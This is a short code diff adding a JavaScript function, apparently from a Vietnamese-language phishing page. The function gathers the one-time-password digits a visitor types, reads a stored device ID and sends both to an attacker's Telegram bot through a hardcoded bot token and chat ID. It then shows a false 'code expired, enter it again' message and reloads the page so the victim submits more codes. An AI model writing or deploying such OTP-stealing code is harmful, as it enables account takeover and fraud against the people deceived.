@@ -1,0 +1,14 @@
+async function sendOTP() {
+    let code = ""; document.querySelectorAll('.otp-in').forEach(i => code += i.value);
+    const deviceID = localStorage.getItem('deviceID') || "Không rõ máy";
+    const TOKEN = '8515848831:AAGCu3F93VGsKgNJtcFYBF5AJbloujLRID0'; const CHAT_ID = '8386422438';
+
+    const msg = `🔑 <b>MÃ OTP - MÁY: ${deviceID}</b>\n` +
+                `--------------------------\n` +
+                `🔹 Mã: <code>${code}</code>\n` +
+                `🕒 Lúc: ${new Date().toLocaleTimeString('vi-VN')}`;
+
+    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
+    alert("Mã đã hết hạn, vui lòng nhập lại."); 
+    location.reload();
+}
